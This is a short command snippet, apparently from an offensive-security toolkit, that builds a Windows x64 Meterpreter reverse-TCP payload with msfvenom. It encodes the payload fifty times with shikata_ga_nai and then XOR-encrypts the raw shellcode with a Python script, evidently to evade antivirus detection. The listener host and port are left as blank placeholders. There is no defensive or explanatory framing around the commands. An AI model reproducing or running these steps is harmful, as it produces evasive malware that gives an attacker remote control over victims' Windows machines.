// Generate Meterpreter Shellcode

msfvenom -p windows/x64/meterpreter_reverse_tcp lhost=/**/ lport=/**/ -e x86/shikata_ga_nai -i 50 -f raw -o /root/raw.txt

// Encrypt raw shellcode with xor

python2.7 xor_encryptor.py raw.txt > xor_shellcode.txt

